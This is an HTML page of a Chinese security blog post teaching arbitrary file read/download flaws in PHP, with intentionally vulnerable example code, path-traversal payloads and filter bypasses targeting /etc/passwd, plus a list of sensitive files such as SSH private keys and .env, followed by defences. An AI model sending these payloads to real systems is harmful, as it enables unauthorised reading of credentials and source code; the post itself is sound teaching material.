@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    
+
+    
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>任意文件读取 / 下载</title>
+<meta name="keywords" content="任意文件读取 / 下载, 安全,渗透测试,应急响应,漏洞分析,安全运维">
+<meta name="description" content="
+一、概述1.1 是什么一些网站提供文件查看或下载功能。如果对用户指定的文件没有限制或限制可被绕过，就可以读取任意文件——源代码、配置文件、系统敏感文件。
+任意文件读取和下载本质无区别：信息都是从服务端流向浏览器，差异只在表现形态（页面展示">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="任意文件读取 / 下载">
+<meta property="og:description" content="
+一、概述1.1 是什么一些网站提供文件查看或下载功能。如果对用户指定的文件没有限制或限制可被绕过，就可以读取任意文件——源代码、配置文件、系统敏感文件。
+任意文件读取和下载本质无区别：信息都是从服务端流向浏览器，差异只在表现形态（页面展示">
+
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="54ury" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="54ury" type="application/rss+xml">
+</head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      
+      
+      <a href="https://z50n6.github.io" class="no-avatar">
+        <h1 class="site-title">54ury</h1>
+      </a>
+    </div>
+    <div class="right">
+        
+        <button type="button" class="theme-switch" id="theme-switch" aria-label="切换亮色/暗色主题" title="切换主题">
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true">
+            <circle cx="12" cy="12" r="4"></circle>
+            <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path>
+          </svg>
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path>
+          </svg>
+        </button>
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<script>
+  // 手动切换亮/暗：写入 html.dark 并记忆到 use-color-scheme（与 head.ejs 的读取键一致）
+  (function () {
+    var btn = document.getElementById('theme-switch');
+    if (!btn) return;
+    btn.addEventListener('click', function () {
+      var isDark = document.documentElement.classList.toggle('dark');
+      try { localStorage.setItem('use-color-scheme', isDark ? 'dark' : 'light'); } catch (e) {}
+    });
+  })();
+</script>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/tags/" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/categories/" class="menu purple-link">
+        分类
+      </a>
+    
+  
+    
+      <a href="/archives/" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/about/" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">任意文件读取 / 下载</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2026-06-28</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/WEB%E6%B8%97%E9%80%8F/">
+              WEB渗透
+                
+                  ，
+                
+              </a>
+            
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
+              基础漏洞
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <hr>
+<h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><h3 id="1-1-是什么"><a href="#1-1-是什么" class="headerlink" title="1.1 是什么"></a>1.1 是什么</h3><p>一些网站提供文件查看或下载功能。如果对用户指定的文件没有限制或限制可被绕过，就可以读取任意文件——源代码、配置文件、系统敏感文件。</p>
+<p>任意文件读取和下载本质无区别：<strong>信息都是从服务端流向浏览器</strong>，差异只在表现形态（页面展示 vs 触发下载行为）。</p>
+<h3 id="1-2-漏洞成因"><a href="#1-2-漏洞成因" class="headerlink" title="1.2 漏洞成因"></a>1.2 漏洞成因</h3><p>四个条件齐了就出事：</p>
+<ol>
+<li>存在读取文件的功能（函数）</li>
+<li>读取文件的路径客户端可控</li>
+<li>路径校验缺失或校验不严被绕过</li>
+<li>输出了文件内容</li>
+</ol>
+<h3 id="1-3-危害"><a href="#1-3-危害" class="headerlink" title="1.3 危害"></a>1.3 危害</h3><ul>
+<li>读取源代码、配置文件、系统敏感文件</li>
+<li>代码审计：从源码中挖更多漏洞（SQL 注入、未授权接口等）</li>
+<li>读取日志获取用户行为和请求记录</li>
+<li>配合其他漏洞构成完整攻击链</li>
+</ul>
+<p>重点关注的文件类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">源代码：.php .jsp .asp .aspx .py .go</span><br><span class="line">配置文件：web.xml .env config.php database.yml httpd.conf my.ini</span><br><span class="line">系统敏感：/etc/passwd /etc/shadow C:\boot.ini</span><br><span class="line">日志：/var/log/apache2/access.log /var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、PHP-文件读取函数"><a href="#二、PHP-文件读取函数" class="headerlink" title="二、PHP 文件读取函数"></a>二、PHP 文件读取函数</h2><h3 id="2-1-三种常用函数"><a href="#2-1-三种常用函数" class="headerlink" title="2.1 三种常用函数"></a>2.1 三种常用函数</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>readfile()</code></td>
+<td>直接读取，自带输出</td>
+</tr>
+<tr>
+<td><code>file_get_contents()</code></td>
+<td>读取内容，需手动 <code>echo</code></td>
+</tr>
+<tr>
+<td><code>fread()</code></td>
+<td>fopen → 计算大小 → 读取 → 输出 → fclose</td>
+</tr>
+</tbody></table>
+<p><strong>readfile()：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fp</span> = <span class="string">&quot;../phpinfo.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>file_get_contents()：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fp</span> = <span class="string">&quot;../phpinfo.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>fread()：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fp</span> = <span class="string">&quot;../phpinfo.php&quot;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$fp</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$f_size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>, <span class="variable">$f_size</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-漏洞触发点"><a href="#2-2-漏洞触发点" class="headerlink" title="2.2 漏洞触发点"></a>2.2 漏洞触发点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fp</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;filepath&#x27;</span>];  <span class="comment">// 客户端可控，没有校验</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?filepath=index.php</span><br><span class="line">?filepath=/etc/passwd</span><br><span class="line">?filepath=c:\windows\system32\drivers\etc\hosts</span><br><span class="line">?filepath=c:\phpstudy_2016\apache\conf\httpd.conf</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>PHP 文件被读取时<strong>不会被解析执行</strong>，而是以源码形式显示在页面源代码中——右键查看源码即可看到。</p>
+</blockquote>
+<hr>
+<h2 id="三、任意文件下载"><a href="#三、任意文件下载" class="headerlink" title="三、任意文件下载"></a>三、任意文件下载</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file-download.php</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="string">&#x27;./a.jpg&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: image/jpg&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; fileName=&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$fp</span>));</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>
+
+<p>和读取的唯一区别：响应头加了 <code>Content-Disposition: attachment</code>，触发浏览器下载行为。但数据流完全一样。</p>
+<hr>
+<h2 id="四、路径过滤与绕过"><a href="#四、路径过滤与绕过" class="headerlink" title="四、路径过滤与绕过"></a>四、路径过滤与绕过</h2><h3 id="4-1-基础过滤"><a href="#4-1-基础过滤" class="headerlink" title="4.1 基础过滤"></a>4.1 基础过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fp</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;filepath&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$fp</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-绕过手法"><a href="#4-2-绕过手法" class="headerlink" title="4.2 绕过手法"></a>4.2 绕过手法</h3><p><strong>双写绕过：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filepath=..././..././..././etc/passwd</span><br><span class="line"><span class="comment"># str_replace 过滤后 → ../../../../etc/passwd</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>绝对路径：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filepath=c:/windows/system32/drivers/etc/hosts</span><br><span class="line">?filepath=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><strong>Windows <code>..\</code> 反斜杠：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filepath=..\..\..\..\..\windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+
+<p><strong>URL 编码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filepath=..%<span class="number">2</span>f..%<span class="number">2</span>f..%<span class="number">2</span>fetc%<span class="number">2</span>fpasswd</span><br><span class="line">?filepath=%<span class="number">2</span>e%<span class="number">2</span>e%<span class="number">2</span>f%<span class="number">2</span>e%<span class="number">2</span>e%<span class="number">2</span>f%<span class="number">2</span>e%<span class="number">2</span>e%<span class="number">2</span>fetc%<span class="number">2</span>fpasswd</span><br></pre></td></tr></table></figure>
+
+<p><strong>双重 URL 编码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filepath=..%<span class="number">252</span>f..%<span class="number">252</span>f..%<span class="number">252</span>fetc%<span class="number">252</span>fpasswd</span><br><span class="line"><span class="comment"># 一次解码 → ..%2f..%2f..%2f → 二次解码 → ../../../</span></span><br></pre></td></tr></table></figure>
+
+<p><strong><code>....//</code> 变种：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filepath=....<span class="comment">//....//....//etc/passwd</span></span><br><span class="line"><span class="comment"># 过滤 ../ 后每段还剩 ../</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>路径截断（PHP &lt; 5.3.4）：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filepath=../../../../etc/passwd%<span class="number">00</span></span><br><span class="line"><span class="comment"># %00 截断后缀拼接</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、挖掘"><a href="#五、挖掘" class="headerlink" title="五、挖掘"></a>五、挖掘</h2><h3 id="5-1-特征参数"><a href="#5-1-特征参数" class="headerlink" title="5.1 特征参数"></a>5.1 特征参数</h3><table>
+<thead>
+<tr>
+<th>从参数看</th>
+<th>从文件名看</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>f=</code> <code>file=</code> <code>filepath=</code> <code>fp=</code></td>
+<td><code>readfile.php</code></td>
+</tr>
+<tr>
+<td><code>path=</code> <code>readpath=</code> <code>url=</code> <code>menu=</code></td>
+<td><code>filedownload.php</code></td>
+</tr>
+<tr>
+<td><code>content=</code> <code>META-INF=</code> <code>WEB-INF=</code></td>
+<td><code>filelist.php</code></td>
+</tr>
+<tr>
+<td><code>download=</code> <code>dir=</code> <code>filename=</code></td>
+<td><code>download.php</code></td>
+</tr>
+</tbody></table>
+<h3 id="5-2-常见敏感文件字典"><a href="#5-2-常见敏感文件字典" class="headerlink" title="5.2 常见敏感文件字典"></a>5.2 常见敏感文件字典</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/hosts</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">C:\windows\system32\drivers\etc\hosts</span><br><span class="line">C:\boot.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># Web 中间件配置</span></span><br><span class="line">c:\phpstudy_2016\apache\conf\httpd.conf</span><br><span class="line">c:\phpstudy_2016\mysql\my.ini</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br><span class="line">WEB-INF/web.xml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前应用</span></span><br><span class="line">index.php</span><br><span class="line">config.php</span><br><span class="line">database.php</span><br><span class="line">.<span class="built_in">env</span></span><br><span class="line">.git/config</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、防御"><a href="#六、防御" class="headerlink" title="六、防御"></a>六、防御</h2><ul>
+<li>白名单机制：只允许访问指定目录，用映射表（传 ID 查路径），不直接拼路径</li>
+<li><code>open_basedir</code> 限定文件访问范围：</li>
+</ul>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">open_basedir</span> = c:\www\</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>避免与其他漏洞叠加：文件包含、目录遍历都会放大文件读取的危害面</li>
+</ul>
+<hr>
+<h2 id="七、案例"><a href="#七、案例" class="headerlink" title="七、案例"></a>七、案例</h2><h3 id="Metinfo-6-0-0"><a href="#Metinfo-6-0-0" class="headerlink" title="Metinfo 6.0.0"></a>Metinfo 6.0.0</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0dot7/p/17227172.html">https://www.cnblogs.com/0dot7/p/17227172.html</a>| <a target="_blank" rel="noopener" href="https://www.cnblogs.com/haorancracker/articles/17698942.html">审计分析</a></p>
+<h3 id="74CMS-文件删除（unlink）"><a href="#74CMS-文件删除（unlink）" class="headerlink" title="74CMS 文件删除（unlink）"></a>74CMS 文件删除（unlink）</h3><p>文件删除函数 <code>unlink</code> 全局搜索。除自身安全引发外，可配合删除重装锁定文件 <code>.lock</code> 进行重装攻击。</p>
+<h3 id="DedeCMS-—-CVE-2022-30508"><a href="#DedeCMS-—-CVE-2022-30508" class="headerlink" title="DedeCMS — CVE-2022-30508"></a>DedeCMS — CVE-2022-30508</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/630020151">DedeCMS 多漏洞组合演练</a></p>
+<hr>
+<blockquote>
+<p><strong>文件读取通常是渗透的先遣侦察</strong>——读源码 → 代码审计 → 找 SQL 注入&#x2F;上传点&#x2F;未授权接口 → 打组合拳。<code>/etc/passwd</code> 只是敲门砖，真正值钱的是源代码里的漏洞。</p>
+</blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/334810.html">FreeBuf — 文件下载漏洞</a></p>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0"><span class="top-box-text">一、概述</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-1-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="top-box-text">1.1 是什么</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-2-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="top-box-text">1.2 漏洞成因</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-3-%E5%8D%B1%E5%AE%B3"><span class="top-box-text">1.3 危害</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%8C%E3%80%81PHP-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%87%BD%E6%95%B0"><span class="top-box-text">二、PHP 文件读取函数</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-1-%E4%B8%89%E7%A7%8D%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="top-box-text">2.1 三种常用函数</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-2-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="top-box-text">2.2 漏洞触发点</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%89%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="top-box-text">三、任意文件下载</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%9B%9B%E3%80%81%E8%B7%AF%E5%BE%84%E8%BF%87%E6%BB%A4%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="top-box-text">四、路径过滤与绕过</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-1-%E5%9F%BA%E7%A1%80%E8%BF%87%E6%BB%A4"><span class="top-box-text">4.1 基础过滤</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-2-%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="top-box-text">4.2 绕过手法</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%94%E3%80%81%E6%8C%96%E6%8E%98"><span class="top-box-text">五、挖掘</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-1-%E7%89%B9%E5%BE%81%E5%8F%82%E6%95%B0"><span class="top-box-text">5.1 特征参数</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-2-%E5%B8%B8%E8%A7%81%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E5%AD%97%E5%85%B8"><span class="top-box-text">5.2 常见敏感文件字典</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%85%AD%E3%80%81%E9%98%B2%E5%BE%A1"><span class="top-box-text">六、防御</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%83%E3%80%81%E6%A1%88%E4%BE%8B"><span class="top-box-text">七、案例</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#Metinfo-6-0-0"><span class="top-box-text">Metinfo 6.0.0</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#74CMS-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88unlink%EF%BC%89"><span class="top-box-text">74CMS 文件删除（unlink）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#DedeCMS-%E2%80%94-CVE-2022-30508"><span class="top-box-text">DedeCMS — CVE-2022-30508</span></a></li></ol></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2026/06/28/csrf/">
+          <h3 class="post-title">
+            
+            下一篇：CSRF 跨站请求伪造
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/z50n6" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+    
+     |
+    
+      <a href="/atom.xml" target="_blank">RSS</a>
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"lazyload_placeholder":null,"photo_zoom":"simple-lightbox"},"search":{"enable":true,"type":"json","placeholder":"输入关键词搜索...","algolia":{"appID":"","apiKey":"","indexName":""}},"language":"zh-CN"}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  </body>
+</html>
+
